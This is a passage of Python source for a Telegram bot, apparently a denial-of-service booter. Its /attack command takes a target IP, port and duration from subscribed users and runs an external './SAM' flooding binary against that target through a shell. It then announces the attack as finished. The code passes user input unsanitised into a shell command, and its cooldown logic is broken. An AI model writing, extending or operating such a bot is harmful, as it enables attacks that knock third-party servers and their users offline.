    bot.reply_to(message, response)
       
# Handler for /attack command
@bot.message_handler(commands=['attack'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
# Check if the user is in admin_id (admins have no cooldown)
        if user_id not in ADMIN_IDS:
# Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
                    response = "You Are On Cooldown . Please Wait 1min Before Running The /attack Command Again."
                    bot.reply_to(message, response)
                    return
                # Update the last time the user ran the command

    # Creating an empty dictionary
    bgmi_cooldown = {}
    bgmi_cooldown[user_id] = datetime.datetime.now()
            
    command = message.text.split()
    if len(command) == 4:  # Updated to accept target, time, and port
       target = command[1]
       port = int(command[2])  # Convert time to integer
       time = int(command[3])  # Convert port to integer
       if time > 600 :
          response = "Error: Time interval must be less than 600."
       else:
                    record_command_logs(user_id, '/attack', target, port, time)
                    log_command(user_id, target, port, time)
                    start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                    full_command = f"./SAM {target} {port} {time} 500"
                    subprocess.run(full_command, shell=True)
                    response = f" 🚀 Attack  Finished! 🚀\n\nTarget IP: {target}\nPort: {port}\nDuration: {time} seconds"
    else:
                response = "✅ Usage :- /attack <target> <port> <time>"  # Updated command syntax
   
        
    bot.reply_to(message, response)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ENTRY POINT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

if __name__ == "__main__":
    remove_expired_users()
    print("━━━━━━━━━━━━━━━━━━━━━━")
    print("   ✅  Bot is running")
    print("━━━━━━━━━━━━━━━━━━━━━━")
    bot.infinity_polling(timeout=30, long_polling_timeout=20)
